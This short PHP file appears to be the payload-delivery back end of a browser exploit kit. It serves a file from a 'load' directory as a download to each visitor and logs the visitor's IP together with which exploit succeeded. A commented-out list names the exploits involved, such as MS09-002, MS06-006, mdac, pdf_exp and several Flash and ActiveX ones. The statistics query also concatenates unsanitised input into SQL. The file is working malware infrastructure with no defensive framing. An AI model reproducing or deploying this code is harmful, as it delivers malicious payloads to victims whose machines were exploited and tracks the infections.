<?php

//error_reporting(0);
include'config.php';
/*
		$spl = $_GET['spl'];
if (($spl !== "Spreadsheet")
and ($spl !== "DirectX_DS")
and ($spl !== "MS09-002")
and ($spl !== "MS06-006")
and ($spl !== "mdac")
and ($spl !== "RoxioCP v3.2")
and ($spl !== "wvf")
and ($spl !== "flash")
and ($spl !== "flash9")
and ($spl !== "flash10")
and ($spl !== "Opera_telnet")
and ($spl !== "compareTo")
and ($spl !== "jno")
and ($spl !== "Font_FireFox")
and ($spl !== "pdf_exp")
and ($spl !== "aol")
and ($spl !== "javad")
and ($spl !== "ActiveX_pack")) 
				{die;exit;}
*/
$spl = $_GET[spl];
$size = filesize("load/".$file_load);
$fp = fopen("load/".$file_load, "r");
if ($source = fread($fp, $size))
{
$ip = $_SERVER['REMOTE_ADDR'];
mysql_connect($db_host, $db_user, $db_pass);
mysql_select_db($db_name);
$q = mysql_query("update statistic set good=1, spl='".$spl."'  where ip='".$ip."'");
@mysql_free_result($q);
header("Content-Disposition: inline; filename=".$file_load);
header("\r\n");
header("Content-Type: application/octet-stream\r\n\r\n");
echo $source;
}
fclose($fp);

?>
